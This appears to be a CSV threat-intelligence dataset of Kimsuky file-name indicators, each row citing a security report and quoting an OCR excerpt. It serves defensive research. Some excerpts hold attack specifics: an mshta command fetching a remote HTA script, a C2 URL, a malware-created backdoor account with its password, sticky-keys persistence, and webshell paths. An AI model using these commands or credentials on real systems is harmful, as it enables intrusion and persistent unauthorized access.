1.0.0,actor--kimsuky,artifact--sha256:671752cd85dc4dc7f275d88592d55f7dff7d30657d13f28b659169af789665a7,observation--sha256:64559b81346076bd9fe0f99dd6e4963e1d45ec75423293e0e3cd12f090408e5c,file-name,makemail.pdb,makemail.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 4}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 三、样本分析 3.1 第一阶段：初始访问 攻击者使用一款名为“MakeMail”的私有工具用以制作钓鱼邮件，文件信息显示开发 语言为朝鲜语，Pdb 路径：“x:\mywork\prevwork\vc attack program\makemail\release\ makemail.pdb”，其中 work 表示开发者可能处于受雇状态，prevwork 表示该工具在攻击 前阶段进行开发，编译时间 2017 年表示攻击者可能在复用之前的工具。 图[2] . MakeMail.exe 程序文件信息 此工具先点击 MakeWord 按钮，根据所设置关键字生成类似字典的 txt 文本，同时文本 内容也可自定义，然后填写对应序号，将指定 eml 文件导入，点击 MakeEmail 按钮将目标 eml 文件中的关键词替换为序号指定的关键词用以制作钓鱼邮件，再借助类似 swaks 之类 的工具进行鱼叉邮件攻击。 图[3] . MakeMail.exe 程序界面,
1.0.0,actor--kimsuky,artifact--sha256:8de5eabde2fabd0b9f2edb6bdc310bf2e7124c026269eb511dd77ed0b22616b3,observation--sha256:646e48a52b945e6011a06958fd9873314097bcc1b89bb33419dbfd8adb1dda4e,file-name,maudittouch-2.1.0.exe,maudittouch-2.1.0.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7b3ba97875f95c6ee6bfc2beb98d6165dbd809c552575720ac26fce119e2e667,observation--sha256:19cc6aedeb30f8c7dabe665d3dfe2ab94bf002cd928ac23d18874521fb462989,file-name,mimikatz.exe,mimikatz.exe,candidate,2021-11-06T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 70}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"In the analysis work pattern of the analyst's sequential processing method, the act of downloading the script was explained as occurring. 2021-11-06 It is a collection of hacking tools and is used by consultants and corporate security teams for mock hacking and penetration testing. Kimsuky 211.168.252.55\users\%ASD%\downloads\mimikatz_trunk\ %SystemDrive%\metasploit- framework\embedded\framework\data\templates\templat 11:21:40 11:21:11 2021-11-06 Excluding the hacking targets, only analysts and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b39f344a9b67639890f398954b08dab115a37734453fb1797e1acfc731fbcf85,observation--sha256:5c98024d8ec90a2b8ea65c0592e32b96ee075d7a806887fc1450d83a1431b5e0,file-name,mimilove.exe,mimilove.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b849b190199abb9b6c67fb4373c0e43f6f16302cd2a34c061d362df3f2e4dd29,observation--sha256:9922bdd9796a20f908c2110d7b22b3ad4dd393007d5748bfecb3567608459c55,file-name,mmm.zip,mmm.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mmm.zip We suspect that phishing emails may have been sent afterwards. It is also possible that the Kimsuky organization only prepared to send phishing emails but did not actually send them. Python used to develop the above espoofer (Figure 29) Kimsuky organization account information and hacking target email address stored in Config.py espoofer-master_google.zip It is impossible to confirm whether the Kimsuky organization sent phishing emails to members of the National Assembly and, if so, the ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b849b190199abb9b6c67fb4373c0e43f6f16302cd2a34c061d362df3f2e4dd29,observation--sha256:34280b51a5a02994da329781e7a0cd4dc6fdc4ecb251cfa4a3fd3cb6ac42d729,file-name,mmm.zip,mmm.zip,candidate,2022-04-12T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 67}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"_x64.rar AhnLab disclosed the analysis information on the ASEC blog around the time of work on Friday, April 29, 2022. Before that, the Kimsuky organization hacked namastte and used 6*.3*.5*.20 to access the uploaded web shell. *(KR), a total of 2 IPs including 118.128.149.119(KR) were used for malware testing. 6*.3*.5*.20*(KR) hxxp://www.namastte.kr/sources/Util/AJAX.php?fpath=/home/nam astte/html/ sources/Util/temp/mmtool&fopen=RdpScan_La05_122 15:29:58 15:53:55 ÿ IP connected to namastte web ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3628336d12473e5bcdb6d901816f9e3a92fb838287c6dc4946a40523abbadd88,observation--sha256:c4ba5b0796ed759492fb269d557549161f29f36d394c9af7417ac84da646d8fa,file-name,mofa.go.kr.7z,mofa.go.kr.7z,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 200}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,inside a file named: mofa.go.kr.7z. The source code was likely taken very,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3628336d12473e5bcdb6d901816f9e3a92fb838287c6dc4946a40523abbadd88,observation--sha256:052f43b0ab1cee4f7586dc2f3e96b14d45a6ffe52cc725e781ede80a44b6f75a,file-name,mofa.go.kr.7z,mofa.go.kr.7z,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Noticeable are the SSL certiﬁcates and auth.log. The source code f o r phishing attacks are discussed further below. 1 . 1 - Defense Counterintelligence Command (dcc.mil.kr) Drop Location: vps/var/www/html/ T h e Defense Counterintelligence Command (DCC) i s an intelligence organization o f the South Korean Armed F o r c e s . The D C C is primarily responsible f o r intelligence missions such a s clandestine and covert operations, and counterintelligence. The logs show a phishing attack again",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3afc3d772d752c04f848883ee2340b35b426a3b4cbb3db778a5240e19327b2df,observation--sha256:8fa89936e64ffc09713afb2ffec89854e2fd0982a6bdbaadb94e4b424c0df226,file-name,moonx.hta,moonx.hta,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,moonx.hta,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b1b7fe4906dd3d90ff5ff3461fea5ec53c8372322970a8f158b4fd19212f3068,observation--sha256:4d345114914dce3e22d185645ffc35791d91235ce0fbf136eed549dcbf8733d8,file-name,ms_x64.dll,ms_x64.dll,candidate,2023-04-08T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 52}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22:01:12 is. This means that the domestic transit point (KR) where this vulnerability exists was hacked through a system hacked by the Kimsuky organization. Since it can be difficult to specify , if ""(Table 4) RDP (CVE-2019-0708) Vulnerability Scanner List"" and ""(Table 5) Public Program List"" are found together during a breach investigation, you can suspect that it is a Kimsuky organization. 22:00:45 HackTool/Win.RdpScan.R437610 KPortScan3.exe, shown in light yellow, will also be released in C2 ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b1b7fe4906dd3d90ff5ff3461fea5ec53c8372322970a8f158b4fd19212f3068,observation--sha256:d63443fa46ecfc82a3e955ae8102091079307b3dab2ff25f6b1943c5fd450b99,file-name,ms_x64.dll,ms_x64.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b1b7fe4906dd3d90ff5ff3461fea5ec53c8372322970a8f158b4fd19212f3068,observation--sha256:eccf1d28327839b64ca40362691631fae2bf749467315d033b54c179bb7218b4,file-name,ms_x64.dll,ms_x64.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 80}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 46) Antivirus diagnostic log of 17*.11*.22*.18*(US) hxxps://asec.ahnlab.com/ko/49843/ First, the word 'exection' in the FILE PATH of ms_x64.dll, shown in light red, is a typo that originally meant execution, and the Kimsuky organization has established the continuity of the connection with 17*.11*.22*.18*(US). To secure it, it can be interpreted as running ms_x64.dll to create an account (DefaultUser / lsjdoif#@$@#09v921) and creating and running %System%\termsvc.dll, which is RDPWraper. ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:51161ea0cb092d3b0e1a2f26dce1bc0edf19f92d3c6b852bab5b48e10ac42e70,observation--sha256:54377ec82f6cd64b0aba4c1f6c7050371a9b5975284e34327a78e14ffc056a29,file-name,ms_x86.dll,ms_x86.dll,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 59}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 50) (Left) First step of phishing, (Middle) Phishing URL, (Right) Phishing URL access log 4- (Figure 48) Phishing and webshell URL information saved in ftp.txt ms_x86.dll is a malicious code used to ensure continuity of connection with a hacked system. It adds ID: DefaultUser / Password: lsjdoif#@$@#09v921 and changes permissions and environment settings to use the RDP function. . As a result of accessing the web shell based on the information above (Figure 48), the ***** researcher's ph",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:51161ea0cb092d3b0e1a2f26dce1bc0edf19f92d3c6b852bab5b48e10ac42e70,observation--sha256:9edc5845da228106a1cf4e44aaed1346943864623fc4f9a3bee124dab9a13f02,file-name,ms_x86.dll,ms_x86.dll,candidate,2021-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 60}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"t1_daumcdnleu.ka Since accessed IP and account information are recorded in the event log, the Windows event log is deleted intermittently. ((painting 27.255.75.137, eHost (KR) 2021.04 ~ 2023.05 t1_daumcdneok. However, it was omitted from this report. It exists, and if exposed to a third party (ex, analyst), it will interfere with the Kimsuky organization's hacking activities, so it is important to prevent this. 2023.04 They are abusing it. In addition, not only webshell URLs but also many malici",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:51161ea0cb092d3b0e1a2f26dce1bc0edf19f92d3c6b852bab5b48e10ac42e70,observation--sha256:34530bb6ae0651b209d02bd3f4ee97a2fe5c7f77b3954cac75deb255f463ed6f,file-name,ms_x86.dll,ms_x86.dll,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e88bb5b05996424fa6b2ee55f294cd469575491836e82eccef6efafa4a9477f7,observation--sha256:987498ab2181d6441c7a7d7c9aef355dba97be2c26b61dc810e26d530c85ee48,file-name,msedge.exe,msedge.exe,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e88bb5b05996424fa6b2ee55f294cd469575491836e82eccef6efafa4a9477f7,observation--sha256:74f6c1f9b38a688cdbb67291bc5fbbb2bef8985840a6939c993f9bd8ee60046f,file-name,msedge.exe,msedge.exe,candidate,2023-05-09T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 74}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"You must log in to view and download attached files, which means that this action was successful. (Table 42) Access ****Lab webmail at 17*.11*.14*.18*(KR) data file It is possible to distribute malware in a limited way after identifying the IP or IP band, but the Kimsuky organization has not yet done so. The presence of IP filtering in list.php is unusual. The possibility is low, and malware infection would have been checked and taken action. There is one additional feature. Below (table http://",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:5dd6503fcebb65bc8870d849dd89a794b33911ee7f18459567e03a16c10f9758,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 53}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport ○해당유형은윈도우정상프로그램인“mshta.exe” 를통해공격자C2서버에서악성페이로드를다운로드하고실행하는과정을가지고있습니다. [그림4-30] MSHTA유형의HTML코드 [그림4-31] GenianEDR 을통한MSHTA유형탐지 Genians SecurityCenter 52,
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:a0500258b5333abf2b815344aaa99f6f1667e378fc5bcd4fe48e23a6460aae9c,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:4f549ea0416ecc06ca8dbafd2aec5c0bfa4728aaa8b6424d51411303fc86010c,file-name,mshta.exe,mshta.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:2a8e6ef573950d09d26018f3616eeee254f5f6561ef5832beea166afb7de6c11,file-name,mshta.exe,mshta.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:5a3fe959afb9bb403a3688acf4998987c909c86415e399d9a66ba098cea4ac97,file-name,mshta.exe,mshta.exe,candidate,2021-03-16T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 5}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[3].伪装“KISA Mobile Security”APP 的启动界面 三、样本分析 3.1 “韩国国防部招标文件” 文 件 名 称 1. 2021 년 사업 계획 (시설본부 자료 참고 보완) - 210316-1 (1. 2021 年经营计划（参考设施总部补充）- 210316-1) SHA25 6 6184acd90c735783aafd32c3346c94332fa8c0212ec128a61f2 764bd224c2535 编 译 时 间 2021/03/16 23:51:07 样本所使用字符串均以加密形式存储，执行后，首先创建互斥体防止重复运行，互斥体 名称""windows update {2021-1020-02-03-A}""。 图[4].在 Dropper 中创建互斥体 接着在当前执行目录释放并执行诱饵文档并模拟打开，文档截图如图[1]所示，其大致 内容为韩国军方相关部门工程、材料等招标文件。 同时还会通过系统组件 mshta.exe 加载执行远程脚本。 URL：http",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:56bfa5ee157e7056ee72982de9fa4af3b3ae9d7f473bb2b439a6ab8f6bc96370,file-name,mshta.exe,mshta.exe,candidate,2021-05-21T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 6}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[6].用于自删除的 bat 文件 3.2 “韩美峰会参考资料” 文件名称 한미 정상회담(5.21) 참고 자료 (수정본) (韩美峰会参考资料（5 月 21 日）（修订版）) SHA256 679a17688cde5d57c4662df12ab134f64931497b87dfffd1cd87fd38ca2feef f 编译时间 2021/05/21 00:12:04 在捆绑“韩美峰会参考资料”相关诱饵文档的木马中，攻击者使用了类似的组件，但使 用 VMP 加壳保护。 图[7].木马 PE 区段中的 vmp 节表 诱饵文档如图[1]所示，引用了近期“韩美首脑会谈”的热点话题，木马执行流程与上 面样本基本一致，调用 mshta.exe 从服务器拉取下阶段脚本执行，二者 IP 解析均指向同一 服务器：104.128.239.70。 URL：http://mail.kumb.cf/?query=5 图[8].利用 mshta 从服务器下载脚本 3.3 间谍模块-Windows 研究人员分析发现，,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5b5cf3536c2f0c7b81573281a7823cbcd7ef948f7530871ab54b66ddaff78978,observation--sha256:5b0e5c404c87ee984222336e8e28dd6885b2328599e08a9625d1724ea97c448a,file-name,mshta.exe,mshta.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 26}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,mshta.exe http://xxx/shop/price/com/first.hta,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:41fb45aa6668c309cc094110af02a71077db5558c225f4df7d5701fa5b688bd2,observation--sha256:1f846c3a816411a1368dcba52e83160121009f43f6d4b14be6ec067ee2a5d399,file-name,mspass.exe,mspass.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:944e0e13a9b0029b4c4d6c1c5d099a55a94e146f1b45075a2ec37057e2f61ebb,observation--sha256:c2e91db31cf3041fb6dd71092971c94ad2205d748631c5683fb4c48a55bd563c,file-name,mstsc.exe,mstsc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 51}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"It was determined that the email account and data were stolen. ÿ The RDP (CVE-2019-0708) vulnerability scanner is confirmed with the same hash value (MD5) as the scanner found in namastte. ÿ Access to email account of hacking target The Kimsuky organization exploited accounts such as DefaultUser and GuestUser of domestic transit stations (KR) for hacking, and collected ÿ Attempt to remotely connect to an external IP using mstsc.exe (Windows Remote Desktop) ÿ C2 management and operation ÿ Install",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:944e0e13a9b0029b4c4d6c1c5d099a55a94e146f1b45075a2ec37057e2f61ebb,observation--sha256:af8036840488a168b0f8ba43e1d96a814da5127dd9e59376d8aac91f40b28298,file-name,mstsc.exe,mstsc.exe,candidate,2020-08-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TARGET2CURRENT_PROCESSTIME TARGET1PARENT_PROCESS 11:27:59 0.0.0.0:57318 This is an IP to which a phishing URL impersonating the Ministry of Unification has been mapped, and recently, a URL for Naver phishing has been mapped as well. There are also many malicious URLs mapped. 2020.08 ~ 2020.09 2020.12 ~ 2021.03 There is evidence that the Kimsuky organization attempted to connect to 78 IPs through RDP at a domestic transit point (KR) from February 2023 to April 2023. mstsc.exe %systemroot%\system3",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bf3c6572f970a2bcf7611a97d9296aad612bfce7dfafa29dfe465b80654830aa,observation--sha256:a1ae800bc1bc6feb35971e4b78927064c1d8e2787c0c7997b93c6d1d64906a71,file-name,myid.php,myid.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--24447f44f83f408c,kimsuky/2024-05-28-kimsuky-webshell.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"페이지 8 / 9 하우리 악성코드 상세 분석 보고서 (10) 피싱 서버에서 웹쉘이 발견됐으며, 취약한 사이트에 웹쉘을 업로드하여 사용 중인 것으로 추정된다. ※ 웹쉘 발견 주소 : hxxp://dgms.or.kr/inc/bottom/myid.php [그림 12] 피싱 서버에서 발견된 웹쉘 (11) 발견된 웹쉘은 북한 해킹 그룹 김수키(Kimsuky)가 사용하는 것으로 알려진 “Green Dinosaur” 웹쉘과 인터페이스 및 코드가 동일한 것으로 확인됐으며, 이번 피싱 공격도 김수키의 소행일 것으로 추정된다. [그림 13] Green Dinosaur 웹쉘 [그림 14] Green Dinosaur, Black 코드 비교",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bf3c6572f970a2bcf7611a97d9296aad612bfce7dfafa29dfe465b80654830aa,observation--sha256:2251f201a463acedf8f05f6dcbde046b32e31d21d064ac00898e98e479eb1e09,file-name,myid.php,myid.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--24447f44f83f408c,kimsuky/2024-05-28-kimsuky-webshell.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,페이지 9 / 9 하우리 악성코드 상세 분석 보고서 IOC Index.php - C456E2E0C015A4D3FEE7E17B7229B9AA myid.php - 5BFA4D6D14C5BAF5AD3DB44BC58CFEE4 hxxp://dgms.or.kr/inc/bottom/fowrkl hxxp://dgms.or.kr/inc/bottom/myid.php hxxp://www.lkh.co.kr/eng/data/ncdos hxxp://www.lkh.co.kr/eng/data/myid.php,Actor-directory corpus sweep; ambiguous values remain candidates.
